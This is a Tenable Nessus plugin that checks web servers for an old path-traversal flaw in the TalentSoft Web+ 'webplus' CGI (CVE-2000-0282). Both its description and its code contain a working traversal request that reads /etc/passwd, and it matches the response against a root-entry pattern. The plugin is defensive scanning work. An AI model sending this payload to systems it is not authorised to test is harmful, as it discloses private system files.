#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10367);
  script_version ("$Revision: 1.23 $");
  script_cve_id("CVE-2000-0282");
  script_bugtraq_id(1102);
  script_xref(name:"OSVDB", value:"280");

  script_name(english:"TalentSoft Web+ webplus CGI Traversal Arbitrary File Access");
  script_summary(english:"Checks if webplus reads any file");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote CGI is vulnerable to information disclosure.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The 'webplus' CGI allows an attacker
to view any file on the target computer by requesting :

  GET /cgi-bin/webplus?script=/../../../../etc/passwd"
  );

  script_set_attribute(
    attribute:'solution',
    value: "Remove the 'webplus' CGI or upgrade to a 'webplus' build higher than version 512."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2000-04/0050.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);

  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  req = string(dir, "/webplus?script=/../../../../etc/passwd");
  w = http_send_recv3(method:"GET", item:req, port:port);
  if (isnull(w)) exit(0);
  result = strcat(w[0], w[1], '\r\n', w[2]);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}

